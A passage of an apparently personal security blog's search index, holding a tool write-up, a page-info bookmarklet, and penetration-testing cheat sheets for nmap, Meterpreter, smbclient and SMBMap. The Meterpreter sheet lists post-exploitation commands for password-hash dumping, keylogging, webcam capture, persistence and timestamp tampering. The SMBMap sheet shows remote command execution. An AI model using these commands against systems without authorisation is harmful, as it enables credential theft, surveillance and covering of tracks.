192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective—sometimes, that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Meterpreter, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\nBasic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. Final Thoughts Meterpreter is your trusty post-exploitation buddy. Use it wisely, creatively, and responsibly. Keep this cheat sheet handy for quick reference—whether you\u0026rsquo;re downloading files, snapping screenshots, or simply making your mark in the digital shadows. Happy hacking!\n","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003cp\u003e\u003cstrong\u003eMeterpreter\u003c/strong\u003e, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\u003c/p\u003e\n\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. Final Thoughts smbclient is a powerful yet straightforward tool for interacting with SMB shares. Whether you’re performing quick tests or conducting audits, it streamlines tasks that would otherwise require mounting shares. Keep this cheat sheet handy for quick reference and efficient file share management!\n","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan 